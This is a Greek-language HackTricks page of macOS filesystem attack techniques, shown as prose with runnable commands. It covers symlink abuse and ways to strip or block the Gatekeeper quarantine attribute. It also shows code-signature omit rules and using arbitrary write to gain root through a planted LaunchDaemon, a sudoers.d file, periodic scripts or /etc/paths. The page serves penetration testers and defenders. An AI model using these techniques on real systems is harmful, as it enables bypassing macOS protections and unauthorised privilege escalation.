# macOS FS Κόλπα

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Συνδυασμοί δικαιωμάτων POSIX

Δικαιώματα σε ένα **κατάλογο**:

* **ανάγνωση** - μπορείτε να **απαριθμήσετε** τις καταχωρήσεις του καταλόγου
* **εγγραφή** - μπορείτε να **διαγράψετε/γράψετε** **αρχεία** στον κατάλογο και μπορείτε να **διαγράψετε κενούς φακέλους**.&#x20;
* Αλλά δεν μπορείτε να **διαγράψετε/τροποποιήσετε μη κενούς φακέλους** εκτός αν έχετε δικαιώματα εγγραφής πάνω τους.
* Δεν μπορείτε να τροποποιήσετε το όνομα ενός φακέλου εκτός αν είστε ο ιδιοκτήτης του.
* **εκτέλεση** - σας επιτρέπεται να διασχίσετε τον κατάλογο - αν δεν έχετε αυτό το δικαίωμα, δεν μπορείτε να έχετε πρόσβαση σε κανένα αρχείο μέσα σε αυτόν, ή σε οποιονδήποτε υποκατάλογο.

### Επικίνδυνοι Συνδυασμοί

**Πώς να αντικαταστήσετε ένα αρχείο/φάκελο που ανήκει στον root**, αλλά:

* Ένας γονικός **ιδιοκτήτης καταλόγου** στη διαδρομή είναι ο χρήστης
* Ένας γονικός **ιδιοκτήτης καταλόγου** στη διαδρομή είναι μια **ομάδα χρηστών** με **δικαίωμα εγγραφής**
* Μια **ομάδα χρηστών** έχει **δικαίωμα εγγραφής** στο **αρχείο**

Με οποιονδήποτε από τους προηγούμενους συνδυασμούς, ένας επιτιθέμενος μπορεί να **εισαγάγει** ένα **σύμβολο/σκληρό σύνδεσμο** στην αναμενόμενη διαδρομή για να αποκτήσει προνομιούχα αυθαίρετη εγγραφή.

### Περίπτωση ειδικής πρόσβασης R+X στον κατάλογο root

Εάν υπάρχουν αρχεία σε έναν **κατάλογο** όπου **μόνο ο root έχει πρόσβαση R+X**, αυτά δεν είναι προσβάσιμα από κανέναν άλλο. Έτσι, μια ευπάθεια που επιτρέπει την **μετακίνηση ενός αρχείου που μπορεί να διαβαστεί από έναν χρήστη**, αλλά δεν μπορεί να διαβαστεί λόγω αυτού του **περιορισμού**, από αυτόν τον φάκελο **σε έναν διαφορετικό**, μπορεί να καταχραστείται για να διαβάσει αυτά τα αρχεία.

Παράδειγμα στο: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Συμβολικός Σύνδεσμος / Σκληρός Σύνδεσμος

Εάν ένα προνομιούχο διεργασία γράφει δεδομένα σε ένα **αρχείο** που μπορεί να **ελεγχθεί** από έναν **χρήστη με χαμηλότερα προνόμια**, ή που μπορεί να έχει **δημιουργηθεί προηγουμένως** από έναν χρήστη με χαμηλότερα προνόμια. Ο χρήστης μπορεί απλά να **τον κατευθύνει σε ένα άλλο αρχείο** μέσω ενός συμβολικού ή σκληρού συνδέσμου, και η προνομιούχα διεργασία θα γράψει σε αυτό το αρχείο.

Ελέγξτε τις άλλες ενότητες όπου ένας επιτιθέμενος μπορεί να **καταχραστεί μια αυθαίρετη εγγραφή για να αναβαθμίσει τα προνόμιά του**.

## .fileloc

Τα αρχεία με την επέκταση **`.fileloc`** μπορούν να δείχνουν σε άλλες εφαρμογές ή δυαδικά αρχεία, έτσι ώστε όταν αυτά ανοίγονται, η εφαρμογή/δυαδικό θα εκτελεστεί.\
Παράδειγμα:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Αυθαίρετο FD

Εάν μπορείτε να κάνετε ένα **διεργασία να ανοίξει ένα αρχείο ή ένα φάκελο με υψηλά προνόμια**, μπορείτε να καταχραστείτε το **`crontab`** για να ανοίξετε ένα αρχείο στο `/etc/sudoers.d` με το **`EDITOR=exploit.py`**, έτσι το `exploit.py` θα λάβει το FD για το αρχείο μέσα στο `/etc/sudoers` και θα το καταχραστεί.

Για παράδειγμα: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Αποφυγή κόλπων xattrs της καραντίνας

### Αφαίρεση τους
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Σημαία uchg / uchange / uimmutable

Αν ένα αρχείο/φάκελος έχει αυτήν την αμετάβλητη ιδιότητα, δεν θα είναι δυνατό να του εφαρμοστεί ένα xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Σύνδεση defvfs

Μια σύνδεση **devfs** **δεν υποστηρίζει xattr**, περισσότερες πληροφορίες στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Αυτό το ACL αποτρέπει την προσθήκη `xattrs` στο αρχείο.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο μαζί με τις ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατόν να δούμε ότι η αναπαράσταση κειμένου του ACL που αποθηκεύεται μέσα στο xattr με το όνομα **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Έτσι, αν συμπιέσετε μια εφαρμογή σε ένα αρχείο zip με τη μορφή αρχείου **AppleDouble** με ένα ACL που εμποδίζει την εγγραφή άλλων xattrs σε αυτό... το xattr της καραντίνας δεν ορίζεται στην εφαρμογή:

Ελέγξτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Για να αναπαράγετε αυτό, πρέπει πρώτα να λάβετε το σωστό αλφαριθμητικό acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Σημείωση ότι ακόμα κι αν αυτό λειτουργεί, το sandbox γράφει το quarantine xattr πρώτα)

Δεν είναι πραγματικά απαραίτητο, αλλά το αφήνω εκεί απλά για περίπτωση:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Παράκαμψη Υπογραφών Κώδικα

Τα Bundles περιέχουν το αρχείο **`_CodeSignature/CodeResources`** το οποίο περιέχει το **hash** κάθε **αρχείου** στο **bundle**. Σημειώστε ότι το hash του CodeResources είναι επίσης **ενσωματωμένο στο εκτελέσιμο**, οπότε δεν μπορούμε να το αλλάξουμε.

Ωστόσο, υπάρχουν ορισμένα αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί, αυτά έχουν το κλειδί omit στο plist, όπως:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Είναι δυνατόν να υπολογιστεί η υπογραφή ενός πόρου από το command line με την ακόλουθη εντολή:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Τοποθέτηση dmgs

Ένας χρήστης μπορεί να τοποθετήσει ένα προσαρμοσμένο αρχείο dmg ακόμα και πάνω από ορισμένους υπάρχοντες φακέλους. Έτσι μπορείτε να δημιουργήσετε ένα προσαρμοσμένο πακέτο dmg με προσαρμοσμένο περιεχόμενο:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Αυθαίρετη Εγγραφή

### Περιοδικά sh scripts

Εάν το σενάριό σας μπορεί να ερμηνευτεί ως ένα **shell script**, μπορείτε να αντικαταστήσετε το **`/etc/periodic/daily/999.local`** shell script που θα εκτελείται καθημερινά.

Μπορείτε να **πλαστογραφήσετε** μια εκτέλεση αυτού του script με: **`sudo periodic daily`**

### Δαίμονες

Γράψτε έναν αυθαίρετο **LaunchDaemon** όπως το **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** με ένα plist που εκτελεί ένα αυθαίρετο script όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Απλά δημιουργήστε το σενάριο `/Applications/Scripts/privesc.sh` με τις **εντολές** που θα θέλατε να εκτελεστούν ως root.

### Αρχείο Sudoers

Εάν έχετε **αυθαίρετη εγγραφή**, μπορείτε να δημιουργήσετε ένα αρχείο μέσα στον φάκελο **`/etc/sudoers.d/`** που θα σας παραχωρεί δικαιώματα **sudo**.

### Αρχεία PATH

Το αρχείο **`/etc/paths`** είναι ένα από τα κύρια μέρη που γεμίζει τη μεταβλητή περιβάλλοντος PATH. Πρέπει να είστε root για να το αντικαταστήσετε, αλλά εάν ένα σενάριο από **προνομιούχο διεργασία** εκτελεί κάποια **εντολή χωρίς την πλήρη διαδρομή**, μπορείτε να το **αποκλέισετε** τροποποιώντας αυτό το αρχείο.

Μπορείτε επίσης να γράψετε αρχεία στο **`/etc/paths.d`** για να φορτώσετε νέους φακέλους στη μεταβλητή περιβάλλοντος `PATH`.

## Αναφορές

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
